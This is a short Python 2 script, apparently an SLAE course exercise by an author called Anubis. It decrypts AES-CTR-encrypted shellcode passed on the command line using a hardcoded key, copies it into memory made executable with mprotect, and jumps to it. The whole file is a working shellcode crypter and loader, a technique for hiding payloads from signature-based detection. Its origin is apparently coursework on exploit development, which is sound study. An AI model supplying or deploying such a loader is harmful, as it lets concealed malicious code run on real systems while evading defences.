#!/usr/bin/python
import sys
import pyaes
import os
from ctypes import *


######################
# Author: Anubis     #
# SLAE               #
######################


key = '0123456789abcdef0123456789abcdef'

counter = pyaes.Counter(initial_value = 100)
aes = pyaes.AESModeOfOperationCTR(key, counter = counter)

crypted_code = sys.argv[1]

shellcode = aes.decrypt(crypted_code.decode("hex"))
final_shellcode = ""
for x in bytearray(shellcode):
	final_shellcode += '\\x'
	final_shellcode += '%02x' % x
print "[+] Decrypted shellcode: %s" % final_shellcode


libC = CDLL('libc.so.6')

shellCode = final_shellcode.replace('\\x', '').decode('hex')

code = c_char_p(shellCode)
sizeOfDecryptedShellcode = len(shellCode)


memAddrPointer = c_void_p(libC.valloc(sizeOfDecryptedShellcode))

codeMovePointer = memmove(memAddrPointer, code, sizeOfDecryptedShellcode)


protectMemory = libC.mprotect(memAddrPointer, sizeOfDecryptedShellcode, 7)

run = cast(memAddrPointer, CFUNCTYPE(c_void_p))

print "[+] Running shellcode now!"

run()

